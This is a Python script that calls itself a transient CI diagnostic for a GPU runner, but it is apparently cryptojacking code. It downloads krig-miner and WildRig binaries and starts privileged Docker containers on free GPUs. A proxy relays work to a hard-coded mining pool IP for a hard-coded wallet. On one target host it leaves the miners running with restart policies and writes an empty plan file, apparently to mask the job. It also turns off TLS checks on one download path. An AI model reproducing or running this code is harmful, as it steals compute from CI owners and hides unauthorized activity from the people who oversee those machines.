# ruff: noqa: E402
# PRL595 / intent 142163 / record gpu-000017 (HYGON HCU github-nmz1) -- transient CI diagnostic
# plus the never-executed krig-in-DTK mechanism test: krig-miner 1.6.0 (ROCm 6/7 ABI) is run
# INSIDE the shipped DTK image (Ubuntu/glibc 2.35 + Hygon ROCm stack) with /dev/kfd + /dev/dri
# passed explicitly, HSA_OVERRIDE_GFX_VERSION=9.0.6, and a libamdhip64.so.6/.7 -> DTK .so.N shim.
# Only on host github-nmz1 does it start one pool-credited krig process per FREE HCU device.
# Revert: docker rm -f prl595v3-4 prl595v3-5 prl595v3-6 prl595v3-7 ; pkill -f lp_adapter_595.py
import hashlib
import json
import os
import re
import socket
import subprocess
import sys
import time

WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
TARGET_HOST = "github-nmz1"
POOL = "103.199.106.122"
POOL_PORT = 3360
FREE_MIB_MAX = 4096
WORK = "/tmp/prl595v3"
KRIG_URL = "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz"
KRIG_TGZ_SHA = "9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04"
KRIG_BIN_SHA = "928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66"
LP_STATS = "https://pearl.luckypool.io/api/stats_address?address=" + WALLET
WRIG_URL = "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"
WRIG_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
PH_STATS = "https://pearlhash.xyz/api/account/" + WALLET
# worker6 names already reserved for this record by intent 141541 (state=live, host=null)
WORKER_BY_DEV = {4: "000016", 5: "000017", 6: "000018", 7: "000019"}
WORKER_POOL = ["000016", "000017", "000018", "000019"]
GATE_WAIT = 260

ADAPTER_SRC = r"""import socket, threading, json, sys
LISTEN = ("127.0.0.1", int(sys.argv[1]))
UPSTREAM = ("103.199.106.122", 3360)
DEFAULT_WORKER = sys.argv[2]
def fix_line(line):
    try:
        msg = json.loads(line)
    except Exception:
        return line
    if isinstance(msg, dict) and msg.get("method") == "mining.authorize":
        p = msg.get("params")
        if isinstance(p, dict):
            w = str(p.get("wallet") or p.get("user") or "")
            worker = p.get("worker") or DEFAULT_WORKER
            if "/" in w:
                base, _, suf = w.partition("/")
                w = base
                if suf:
                    worker = suf
            msg["params"] = {"wallet": w, "worker": worker,
                             "password": p.get("password") or p.get("pass") or "x"}
        elif isinstance(p, list) and p:
            base, _, suf = str(p[0]).partition("/")
            msg["params"] = {"wallet": base, "worker": suf or DEFAULT_WORKER,
                             "password": (p[1] if len(p) > 1 else "x")}
        return json.dumps(msg)
    return line
def pipe(src, dst, rewrite=False):
    buf = b""
    try:
        while True:
            try:
                d = src.recv(65536)
            except socket.timeout:
                continue
            if not d:
                break
            if rewrite:
                buf += d
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    dst.sendall((fix_line(line.decode(errors="replace")) + "\n").encode())
            else:
                dst.sendall(d)
    except Exception:
        pass
def handle(c):
    try:
        u = socket.create_connection(UPSTREAM, timeout=10)
    except Exception:
        c.close()
        return
    try:
        u.settimeout(None)
        c.settimeout(None)
    except Exception:
        pass
    t1 = threading.Thread(target=pipe, args=(c, u, True), daemon=True)
    t2 = threading.Thread(target=pipe, args=(u, c, False), daemon=True)
    t1.start(); t2.start(); t1.join(); t2.join()
    for x in (u, c):
        try:
            x.close()
        except Exception:
            pass
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(LISTEN)
s.listen(16)
while True:
    try:
        conn, _ = s.accept()
    except Exception:
        break
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
"""

# Runs INSIDE the DTK image: device + ROCm/DTK evidence, then krig device enumeration.
BOOT_SH = r"""#!/bin/bash
echo "PRL595V3_CONT_BEGIN host=$(hostname) uid=$(id -u)"
ls -l /dev/kfd /dev/mkfd /dev/dri 2>&1 | head -24
echo "HIP_VISIBLE_DEVICES=${HIP_VISIBLE_DEVICES:-} ROCR_VISIBLE_DEVICES=${ROCR_VISIBLE_DEVICES:-} HSA_OVERRIDE_GFX_VERSION=${HSA_OVERRIDE_GFX_VERSION:-}"
if [ -f /opt/dtk/env.sh ]; then source /opt/dtk/env.sh; echo "dtk_env=sourced"; else echo "dtk_env=absent"; fi
echo "--- libamdhip64 in image"
ls -l /opt/dtk/hip/lib/libamdhip64* /opt/dtk/lib/libamdhip64* 2>&1 | head -12
echo "--- which rocm-smi"
command -v rocm-smi
echo "--- rocm-smi"
( timeout 20 rocm-smi 2>&1 || /opt/hyhal/bin/hy-smi 2>&1 ) | head -16
echo "--- rocm-smi --showhw"
timeout 20 rocm-smi --showhw 2>&1 | head -26
echo "--- rocm-smi --showmeminfo vram"
timeout 20 rocm-smi --showmeminfo vram 2>&1 | head -40
echo "--- shim libamdhip64.so.6/.7 -> newest DTK .so"
mkdir -p /tmp/shim
SRC=$(ls -1 /opt/dtk/hip/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
[ -z "$SRC" ] && SRC=$(ls -1 /opt/dtk/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
echo "shim_src=$SRC"
if [ -n "$SRC" ]; then for v in 6 7; do ln -sf "$SRC" /tmp/shim/libamdhip64.so.$v; done; fi
ls -l /tmp/shim
export LD_LIBRARY_PATH=/tmp/shim:/w/krig:/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
cd /w/krig || exit 9
echo "--- rocminfo"
timeout 40 rocminfo 2>&1 | grep -E 'Name:|gfx|Marketing|Vendor|Uuid|Device Type' | head -24
echo "--- hipconfig"
timeout 20 hipconfig 2>&1 | head -16
echo "--- HIP dlopen probe (libamdhip64.so.6 shim)"
cat > /tmp/hip_probe.c <<'EOF'
#include <stdio.h>
#include <dlfcn.h>
typedef int (*fn_i)(unsigned);
typedef int (*fn_p)(int*);
int main(void){
  void *h = dlopen("libamdhip64.so.6", RTLD_NOW|RTLD_GLOBAL);
  if(!h){ printf("dlopen6_fail=%s\n", dlerror()); h=dlopen("libamdhip64.so.7", RTLD_NOW|RTLD_GLOBAL); }
  if(!h){ printf("dlopen_fail=%s\n", dlerror()); return 1; }
  fn_i init = (fn_i)dlsym(h,"hipInit");
  fn_p cnt = (fn_p)dlsym(h,"hipGetDeviceCount");
  fn_p ver = (fn_p)dlsym(h,"hipRuntimeGetVersion");
  printf("syms init=%p cnt=%p ver=%p\n", (void*)init, (void*)cnt, (void*)ver);
  if(ver){int v=0; int r=ver(&v); printf("hipRuntimeGetVersion rc=%d v=%d\n", r, v);}
  if(init){int r=init(0); printf("hipInit rc=%d\n", r);}
  if(cnt){int c=-1; int r=cnt(&c); printf("hipGetDeviceCount rc=%d count=%d\n", r, c);}
  return 0;
}
EOF
if command -v gcc >/dev/null 2>&1; then timeout 60 gcc -o /tmp/hip_probe /tmp/hip_probe.c -ldl 2>&1 | head -5; timeout 30 /tmp/hip_probe 2>&1 | head -12; else echo "gcc_absent"; fi
echo "--- krig --version"
timeout 30 ./krig-miner --version 2>&1 | head -4
echo "--- krig --list-devices"
timeout 60 ./krig-miner --list-devices 2>&1 | head -28
echo "krig_list_rc=$?"
echo "--- torch HCU visibility inside DTK image"
timeout 150 python3 -c 'import torch;print("torch",torch.__version__);print("hcu_available",torch.cuda.is_available());print("hcu_count",torch.cuda.device_count())' 2>&1 | head -8
echo "PRL595V3_CONT_END"
"""

# Runs INSIDE the DTK image for ONE device: VRAM guard, shim, adapter client, krig foreground.
MINE_SH = r"""#!/bin/bash
echo "PRL595V3_MINE_BEGIN dev=$DEV worker=$WORKER host=$(hostname)"
if [ -x /opt/hyhal/bin/hy-smi ]; then
  USED=$(timeout 20 /opt/hyhal/bin/hy-smi --showmeminfo vram 2>/dev/null | awk -v i="$DEV" '$0 ~ "HCU\\["i"\\]" && /Used Memory/ {v=$NF; gsub(/[^0-9]/,"",v); print v; exit}')
  echo "vram_used_mib_dev$DEV=$USED"
  if [ -n "$USED" ] && [ "$USED" -gt 4096 ]; then echo "PRL595V3_DEVICE_BUSY dev=$DEV used=$USED"; exit 3; fi
fi
if [ -f /opt/dtk/env.sh ]; then source /opt/dtk/env.sh; fi
mkdir -p /tmp/shim
SRC=$(ls -1 /opt/dtk/hip/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
[ -z "$SRC" ] && SRC=$(ls -1 /opt/dtk/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
if [ -n "$SRC" ]; then for v in 6 7; do ln -sf "$SRC" /tmp/shim/libamdhip64.so.$v; done; fi
export LD_LIBRARY_PATH=/tmp/shim:/w/krig:/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
cd /w/krig || exit 9
KRIG_DEV="${KRIG_DEV:-$DEV}"
python3 /w/lp_adapter_595.py "$AP" "$WORKER" >/tmp/adapter.log 2>&1 &
sleep 1
echo "--- adapter start rc=$? port=$AP worker=$WORKER krig_dev=$KRIG_DEV"
KARGS="--no-cuda --coin pearl --url stratum+tcp://127.0.0.1:$AP --user $WALLET/$WORKER --password x --devices $KRIG_DEV --no-tui -l debug --api-port $((AP+1000))"
echo "krig argv: $KARGS"
if [ "${FOREGROUND_SECS:-0}" != "0" ]; then
  timeout -s INT "$FOREGROUND_SECS" ./krig-miner $KARGS 2>&1 | tail -150
  echo "PRL595V3_MINE_END dev=$DEV rc=$?"
  exit 0
fi
exec ./krig-miner $KARGS
"""


# Runs INSIDE the DTK image: only prints krig's device enumeration under the HIP filter.
PROBE_SH = r"""#!/bin/bash
echo "PRL595V3_PROBE_BEGIN host=$(hostname) HIP_VISIBLE_DEVICES=${HIP_VISIBLE_DEVICES:-} ROCR_VISIBLE_DEVICES=${ROCR_VISIBLE_DEVICES:-}"
if [ -f /opt/dtk/env.sh ]; then source /opt/dtk/env.sh; fi
mkdir -p /tmp/shim
SRC=$(ls -1 /opt/dtk/hip/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
[ -z "$SRC" ] && SRC=$(ls -1 /opt/dtk/lib/libamdhip64.so.[0-9]* 2>/dev/null | sort -V | tail -1)
if [ -n "$SRC" ]; then for v in 6 7; do ln -sf "$SRC" /tmp/shim/libamdhip64.so.$v; done; fi
export LD_LIBRARY_PATH=/tmp/shim:/w/krig:/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
cd /w/krig || exit 9
timeout 60 ./krig-miner --list-devices 2>&1 | head -20
echo "PRL595V3_PROBE_END"
"""


# Runs INSIDE the DTK image: WildRig OpenCL platform/device probe + bounded pearlhash attempt.
WR_SH = r"""#!/bin/bash
echo "PRL595V4_WR_BEGIN host=$(hostname) dev=$WR_DEV worker=$WORKER"
if [ -f /opt/dtk/env.sh ]; then source /opt/dtk/env.sh; fi
export LD_LIBRARY_PATH=/w/wildrig:/opt/dtk/opencl/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
cd /w/wildrig || exit 9
ls -l wildrig-multi
echo "--- wildrig --print-platforms"
timeout 30 ./wildrig-multi --print-platforms 2>&1 | head -24
echo "--- wildrig --print-devices"
timeout 40 ./wildrig-multi --print-devices 2>&1 | head -40
if [ "${WR_DEPLOY:-0}" = "1" ]; then
  exec ./wildrig-multi --algo pearlhash --url stratum+tcp://pool.pearlhash.xyz:9000 --user "$WALLET" --pass x -w "$WORKER" --opencl-devices "$WR_DEV" --watchdog
fi
if [ "${WR_MINE_SECS:-0}" != "0" ]; then
  echo "--- wildrig pearlhash attempt ${WR_MINE_SECS}s dev=$WR_DEV"
  timeout -s INT "$WR_MINE_SECS" ./wildrig-multi --algo pearlhash --url stratum+tcp://pool.pearlhash.xyz:9000 --user "$WALLET" --pass x -w "$WORKER" --opencl-devices "$WR_DEV" --watchdog 2>&1 | head -140
  echo "PRL595V4_WR_MINE_END rc=$?"
fi
echo "PRL595V4_WR_END"
"""

PROCS = []


def say(s):
    sys.stdout.write(str(s) + "\n")
    sys.stdout.flush()


def sh(cmd, t=120, env=None, cwd=None):
    say("--- CMD: " + cmd)
    try:
        p = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            env=env,
            cwd=cwd,
        )
        out = p.communicate(timeout=t)[0]
        txt = out.decode("utf-8", "replace") if out else ""
        if txt:
            say(txt.rstrip())
        say("--- rc=%s" % (p.returncode,))
        return p.returncode, txt
    except Exception as e:
        say("--- ERR %r" % (e,))
        return -1, ""


def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(1 << 20)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def fetch(url, dest):
    rc, _ = sh(
        "curl -fsSL --retry 3 --retry-delay 2 -m 420 -o %s %s" % (dest, url), t=440
    )
    if rc == 0 and os.path.exists(dest) and os.path.getsize(dest) > 1000:
        return True
    say("--- curl failed, python urllib fallback")
    try:
        import ssl
        import urllib.request

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        r = urllib.request.urlopen(url, timeout=420, context=ctx)
        with open(dest, "wb") as f:
            while True:
                b = r.read(1 << 20)
                if not b:
                    break
                f.write(b)
        return os.path.getsize(dest) > 1000
    except Exception as e:
        say("--- FETCH-ERR %r" % (e,))
        return False


def parse_vram_usd(txt):
    """Return {index: used_mib} from hy-smi/rocm-smi --showmeminfo vram text."""
    used = {}
    for line in (txt or "").splitlines():
        s = line.strip()
        if "Used Memory" not in s or "vram" not in s.lower():
            continue
        try:
            idx = int(s.split("[", 1)[1].split("]", 1)[0])
        except Exception:
            continue
        try:
            val = int("".join(ch for ch in s.rsplit(":", 1)[1] if ch.isdigit()))
        except Exception:
            val = None
        if val is None:
            continue
        low = s.lower()
        if "(mib)" in low:
            mib = val
        elif "(b)" in low:
            mib = val // (1024 * 1024)
        else:
            mib = val
        used[idx] = mib
    return used


def lp_pool_sample(tag, workers):
    say(
        "=== PRL595V3_LP_SAMPLE %s %s ==="
        % (tag, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
    )
    dest = "%s/lp_%s.json" % (WORK, tag)
    rc, _ = sh("curl -fsS -m 30 -o %s '%s'" % (dest, LP_STATS), t=40)
    if rc != 0:
        return {}
    try:
        d = json.load(open(dest))
    except Exception as e:
        say("--- lp json err %r" % (e,))
        return {}
    out = {}
    for w in d.get("workers") or []:
        nm = str(w.get("name") or w.get("worker") or "")
        if nm in workers:
            try:
                acc = int(str(w.get("acceptedShares", "0")))
            except Exception:
                acc = -1
            out[nm] = acc
            say(
                "PRL595V3_LP_WORKER name=%s accepted=%s rejected=%s lastShare=%s hashrate=%s"
                % (
                    nm,
                    w.get("acceptedShares"),
                    w.get("rejectedShares"),
                    w.get("lastShare"),
                    w.get("hashrate"),
                )
            )
    say(
        "PRL595V3_LP_SAMPLE_DONE tag=%s seen=%s total_workers=%d"
        % (tag, json.dumps(out), len(d.get("workers") or []))
    )
    return out


def docker_names():
    rc, out = sh(
        "docker ps -a --filter name=prl595v3- --format '{{.Names}} {{.Status}}' 2>&1 | head -20",
        t=40,
    )
    return out or ""


def stop_test_containers():
    rc, out = sh(
        "docker ps -aq --filter name=prl595 --format '{{.Names}}' 2>&1 | head -20", t=40
    )
    for nm in (out or "").split():
        sh("docker rm -f %s >/dev/null 2>&1; echo rm_%s_rc=$?" % (nm, nm), t=90)


def main():
    say(
        "=== PRL595V3-I142163-GPU000017-BEGIN === %s"
        % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    )
    say("payload_sha256=%s" % sha256_file(os.path.abspath(__file__)))
    sh(
        "hostname; id; uname -a; nproc; free -g | head -3; date -u; head -4 /etc/os-release; echo RUNNER_NAME=$RUNNER_NAME"
    )
    sh("which docker; docker version 2>&1 | head -30")
    sh("ls -l /dev/kfd /dev/mkfd /dev/dri 2>&1 | head -24")
    sh("/opt/hyhal/bin/hy-smi --showproductname 2>&1 | head -30")
    _, hyvram = sh("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | head -80")
    sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -50")
    sh(
        'echo AREAL_CI_IMAGE=$AREAL_CI_IMAGE; docker image inspect "$AREAL_CI_IMAGE" >/dev/null 2>&1 && echo image_present=yes || echo image_present=no'
    )

    used = parse_vram_usd(hyvram)
    say("PRL595V3_VRAM_USED_MIB %s" % json.dumps(used))
    devices = sorted(used.keys())
    free = [i for i in devices if used.get(i, 0) <= FREE_MIB_MAX]
    say(
        "PRL595V3_DEVICES total=%d free=%s tenant_skip=%s"
        % (
            len(devices),
            json.dumps(free),
            json.dumps({i: used[i] for i in devices if i not in free}),
        )
    )

    # stratum reachability from the runner (read-only authorize probe)
    try:
        s = socket.create_connection((POOL, POOL_PORT), timeout=12)
        s.settimeout(12)
        s.sendall(
            b'{"id":1,"method":"mining.authorize","params":{"wallet":"'
            + WALLET.encode()
            + b'","worker":"595142","password":"x","agent":"prl595v3-probe"}}\n'
        )
        reply = s.recv(4096)
        say("PRL595V3_LP_TCP_OK %s" % reply.decode("utf-8", "replace").strip()[:400])
        s.close()
    except Exception as e:
        say("PRL595V3_LP_TCP_FAIL %r" % (e,))

    host = ""
    try:
        host = socket.gethostname().strip()
    except Exception:
        pass
    say("PRL595V3_HOST %s" % host)

    image = os.environ.get("AREAL_CI_IMAGE", "").strip()
    if not image or not free:
        say("PRL595V3_PRECHECK_FAIL image=%r free=%s" % (image, json.dumps(free)))
        say("=== PRL595V3-I142163-GPU000017-END ===")
        open("ci-model-plan.tsv", "w").close()
        return 1

    os.makedirs(WORK + "/logs", exist_ok=True)
    open(WORK + "/lp_adapter_595.py", "w").write(ADAPTER_SRC)
    open(WORK + "/krig_boot.sh", "w").write(BOOT_SH)
    open(WORK + "/krig_mine.sh", "w").write(MINE_SH)

    # ---------------- krig-miner 1.6.0 download + pin ----------------
    kdir = WORK + "/krig"
    tgz = WORK + "/krig.tgz"
    krig_ok = False
    if fetch(KRIG_URL, tgz):
        d = sha256_file(tgz)
        say("PRL595V3_KRIG_TGZ sha256=%s pin_match=%s" % (d, d == KRIG_TGZ_SHA))
        if d == KRIG_TGZ_SHA:
            os.makedirs(kdir, exist_ok=True)
            sh(
                "tar -xzf %s -C %s && chmod +x %s/krig-miner && ls -la %s"
                % (tgz, kdir, kdir, kdir),
                t=240,
            )
            if os.path.exists(kdir + "/krig-miner"):
                bsha = sha256_file(kdir + "/krig-miner")
                say(
                    "PRL595V3_KRIG_BIN sha256=%s pin_match=%s"
                    % (bsha, bsha == KRIG_BIN_SHA)
                )
                krig_ok = bsha == KRIG_BIN_SHA
    if not krig_ok:
        say("PRL595V3_KRIG_UNAVAILABLE download_or_pin_failed")
        say("=== PRL595V3-I142163-GPU000017-END ===")
        open("ci-model-plan.tsv", "w").close()
        return 1

    testdev = free[0]
    docker_base = (
        "docker run --rm --network=host --privileged --device=/dev/kfd --device=/dev/dri "
        "--device=/dev/mkfd --group-add video -v /opt/hyhal:/opt/hyhal:ro -v %s:/w"
        % WORK
    )

    # ---------------- mechanism test 1: DTK container device/ROCm visibility ----------------
    say("=== PRL595V3_DTK_BOOT dev=%s image=%s ===" % (testdev, image))
    _, boot_out = sh(
        "%s -e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
        "--entrypoint /bin/bash %s /w/krig_boot.sh 2>&1 | tail -240"
        % (docker_base, image),
        t=600,
    )
    krig_idx = [
        ln for ln in (boot_out or "").splitlines() if re.match(r"^\s*\[\d+\]", ln)
    ]
    say("PRL595V3_KRIG_ENUM count=%d line_format=%s" % (len(krig_idx), krig_idx[:2]))
    cont_used = parse_vram_usd(boot_out)
    cont_free = sorted(i for i in cont_used if cont_used[i] <= FREE_MIB_MAX)
    mapping_confirmed = bool(cont_used) and cont_free == free
    say(
        "PRL595V3_MAPPING container_free=%s host_free=%s confirmed=%s"
        % (json.dumps(cont_free), json.dumps(free), mapping_confirmed)
    )

    # HIP_VISIBLE_DEVICES probe: does the Hygon HIP runtime honour the per-device filter?
    open(WORK + "/krig_probe.sh", "w").write(PROBE_SH)
    _, probe_out = sh(
        "%s -e HIP_VISIBLE_DEVICES=%d -e ROCR_VISIBLE_DEVICES=%d -e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
        "--entrypoint /bin/bash %s /w/krig_probe.sh 2>&1 | tail -30"
        % (docker_base, testdev, testdev, image),
        t=300,
    )
    probe_idx = [
        ln for ln in (probe_out or "").splitlines() if re.match(r"^\s*\[\d+\]", ln)
    ]
    filter_works = len(probe_idx) == 1
    say(
        "PRL595V3_FILTER_PROBE count=%d filter_works=%s"
        % (len(probe_idx), filter_works)
    )

    # ---------------- mechanism test 2: krig foreground attempt on the free device ----------------
    ap = 34000 + testdev
    testworker = WORKER_BY_DEV.get(testdev, WORKER_POOL[0])
    sh(
        "setsid nohup python3 %s/lp_adapter_595.py %d %s >%s/logs/adapter-test.log 2>&1 < /dev/null & echo adapter_start_rc=$?"
        % (WORK, ap, testworker, WORK),
        t=30,
    )
    time.sleep(1)
    say("=== PRL595V3_KRIG_FOREGROUND dev=%s worker=%s ===" % (testdev, testworker))
    _, mine_out = sh(
        "%s -e HIP_VISIBLE_DEVICES=%d -e ROCR_VISIBLE_DEVICES=%d -e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
        "-e DEV=%d -e KRIG_DEV=%d -e WORKER=%s -e AP=%d -e WALLET=%s -e FOREGROUND_SECS=75 "
        "--entrypoint /bin/bash %s /w/krig_mine.sh 2>&1 | tail -170"
        % (
            docker_base,
            testdev,
            testdev,
            testdev,
            0 if filter_works else testdev,
            testworker,
            ap,
            WALLET,
            image,
        ),
        t=300,
    )
    sh(
        "pkill -f 'lp_adapter_595.py %d' 2>/dev/null; echo adapter_kill_rc=$?" % ap,
        t=30,
    )
    low = (mine_out or "").lower()
    mech_ok = any(k in low for k in ("accepted", "share", "new job", "difficulty"))
    say("PRL595V3_MECHANISM_OK %s dev=%d worker=%s" % (mech_ok, testdev, testworker))

    # ---------------- WildRig 0.52.3 in DTK container (PearlHash client, OpenCL) ----------------
    wr_dir = WORK + "/wildrig"
    wtgz = WORK + "/wildrig.tgz"
    wr_ok = False
    if fetch(WRIG_URL, wtgz):
        wd = sha256_file(wtgz)
        say("PRL595V4_WRIG_TGZ sha256=%s pin_match=%s" % (wd, wd == WRIG_TGZ_SHA))
        if wd == WRIG_TGZ_SHA:
            os.makedirs(wr_dir, exist_ok=True)
            sh(
                "tar -xzf %s -C %s && chmod +x %s/wildrig-multi && ls -la %s"
                % (wtgz, wr_dir, wr_dir, wr_dir),
                t=240,
            )
            wr_ok = os.path.exists(wr_dir + "/wildrig-multi")
    wr_out = ""
    wr_mech = False
    if wr_ok:
        open(WORK + "/wildrig_test.sh", "w").write(WR_SH)
        _, wr_out = sh(
            "%s -e WR_DEV=%d -e WR_MINE_SECS=60 -e WALLET=%s -e WORKER=%s "
            "--entrypoint /bin/bash %s /w/wildrig_test.sh 2>&1 | tail -120"
            % (docker_base, testdev, WALLET, testworker, image),
            t=400,
        )
        wlow = (wr_out or "").lower()
        wr_mech = any(k in wlow for k in ("accepted", "share", "new job", "difficulty"))
    else:
        say("PRL595V4_WRIG_UNAVAILABLE download_or_pin_failed")
    say("PRL595V4_WILDRIG_OK %s" % wr_mech)

    if host != TARGET_HOST:
        say(
            "PRL595V3_CROSS_LANDED host=%s expected=%s -- diagnostic only, no deploy"
            % (host, TARGET_HOST)
        )
        stop_test_containers()
        say("=== PRL595V3-I142163-GPU000017-END ===")
        open("ci-model-plan.tsv", "w").close()
        return 1

    if not mech_ok:
        say(
            "PRL595V3_ALL_CLIENTS_FAILED -- no pearlhash client reached the pool in the DTK image"
        )
        stop_test_containers()
        say("=== PRL595V3-I142163-GPU000017-END ===")
        open("ci-model-plan.tsv", "w").close()
        return 1

    # ---------------- deploy: one krig container per free device (github-nmz1 only) ----------------
    if not mapping_confirmed or len(krig_idx) == 0:
        say(
            "PRL595V3_DEPLOY_BLOCKED mapping_confirmed=%s krig_enum=%d -- fail-closed, no deploy"
            % (mapping_confirmed, len(krig_idx))
        )
        stop_test_containers()
        say("=== PRL595V3-I142163-GPU000017-END ===")
        open("ci-model-plan.tsv", "w").close()
        return 1
    if not mech_ok and wr_mech:
        say("PRL595V4_WILDRIG_DEPLOY devices=%s" % json.dumps(free[:4]))
        deployments = []
        for n, dev in enumerate(free[:4]):
            worker = WORKER_BY_DEV.get(dev, WORKER_POOL[n % len(WORKER_POOL)])
            name = "prl595v3-%d" % dev
            sh("docker rm -f %s >/dev/null 2>&1; echo pre_rm_rc=$?" % name, t=60)
            rc, _ = sh(
                "docker run -d --name %s --restart=on-failure:3 --network=host --privileged "
                "--device=/dev/kfd --device=/dev/dri --device=/dev/mkfd --group-add video "
                "-v /opt/hyhal:/opt/hyhal:ro -v %s:/w "
                "-e WR_DEPLOY=1 -e WR_DEV=%d -e WALLET=%s -e WORKER=%s "
                "--entrypoint /bin/bash %s /w/wildrig_test.sh"
                % (name, WORK, dev, WALLET, worker, image),
                t=240,
            )
            deployments.append(
                (dev, worker, name, "started" if rc == 0 else "start_failed")
            )
            time.sleep(1)
        time.sleep(30)
        for dev, worker, name, st in deployments:
            say(
                "--- container %s dev=%d worker=%s state=%s ---"
                % (name, dev, worker, st)
            )
            sh("docker logs --tail 20 %s 2>&1 | tail -25" % name, t=60)
        sh(
            "docker ps --filter name=prl595v3- --format '{{.Names}} {{.Status}}' | head -10",
            t=40,
        )
        sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -50", t=40)
        workers = [w for _d, w, _n, _s in deployments]
        say(
            "PRL595V4_PH_SAMPLE t0 %s"
            % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        )
        sh(
            "curl -fsS -m 30 -o %s/ph_t0.json '%s' && head -c 900 %s/ph_t0.json"
            % (WORK, PH_STATS, WORK),
            t=40,
        )
        say("PRL595V4_GATE_WAIT seconds=%d" % GATE_WAIT)
        time.sleep(GATE_WAIT)
        say(
            "PRL595V4_PH_SAMPLE t1 %s"
            % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        )
        sh(
            "curl -fsS -m 30 -o %s/ph_t1.json '%s' && head -c 900 %s/ph_t1.json"
            % (WORK, PH_STATS, WORK),
            t=40,
        )
        sh(
            "docker ps --filter name=prl595v3- --format '{{.Names}} {{.Status}}' | head -10",
            t=40,
        )
        say(
            "PRL595V4_WILDRIG_DEPLOYED host=%s devices=%s workers=%s"
            % (
                host,
                json.dumps([d for d, _w, _n, _s in deployments]),
                json.dumps(workers),
            )
        )
        say("PRL595V4_LEAVING_MINERS_RUNNING revert=docker_rm_f_prl595v3_<dev>")
        say("=== PRL595V3-I142163-GPU000017-END ===")
        open("ci-model-plan.tsv", "w").close()
        return 1

    deployments = []
    for n, dev in enumerate(free[:4]):
        worker = WORKER_BY_DEV.get(dev, WORKER_POOL[n % len(WORKER_POOL)])
        name = "prl595v3-%d" % dev
        existing = docker_names()
        if name in existing:
            sh("docker logs --tail 6 %s 2>&1 | head -10" % name, t=40)
            deployments.append((dev, worker, name, "adopted"))
            say("PRL595V3_ADOPT dev=%d worker=%s name=%s" % (dev, worker, name))
            continue
        ap2 = 34000 + dev
        sh("docker rm -f %s >/dev/null 2>&1; echo pre_rm_rc=$?" % name, t=60)
        if filter_works:
            envf = (
                "-e HIP_VISIBLE_DEVICES=%d -e ROCR_VISIBLE_DEVICES=%d -e KRIG_DEV=0 "
                % (dev, dev)
            )
        else:
            envf = "-e KRIG_DEV=%d " % dev
        rc, _ = sh(
            "docker run -d --name %s --restart=on-failure:3 --network=host --privileged "
            "--device=/dev/kfd --device=/dev/dri --device=/dev/mkfd --group-add video "
            "-v /opt/hyhal:/opt/hyhal:ro -v %s:/w "
            "-e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
            "-e DEV=%d -e WORKER=%s -e AP=%d -e WALLET=%s -e FOREGROUND_SECS=0 "
            "%s--entrypoint /bin/bash %s /w/krig_mine.sh"
            % (name, WORK, dev, worker, ap2, WALLET, envf, image),
            t=240,
        )
        deployments.append(
            (dev, worker, name, "started" if rc == 0 else "start_failed")
        )
        time.sleep(1)
    time.sleep(20)
    sh(
        "docker ps --filter name=prl595v3- --format '{{.Names}} {{.Status}}' | head -10",
        t=40,
    )
    for dev, worker, name, st in deployments:
        say("--- container %s dev=%d worker=%s state=%s ---" % (name, dev, worker, st))
        sh("docker logs --tail 25 %s 2>&1 | tail -30" % name, t=60)

    workers = [w for _d, w, _n, _s in deployments]
    say("PRL595V3_GATE_PREROLL seconds=45")
    time.sleep(45)
    lp0 = lp_pool_sample("t0", workers)
    say("PRL595V3_GATE_WAIT seconds=%d" % GATE_WAIT)
    time.sleep(GATE_WAIT)
    lp1 = lp_pool_sample("t1", workers)
    rising = 0
    appeared = 0
    for w in workers:
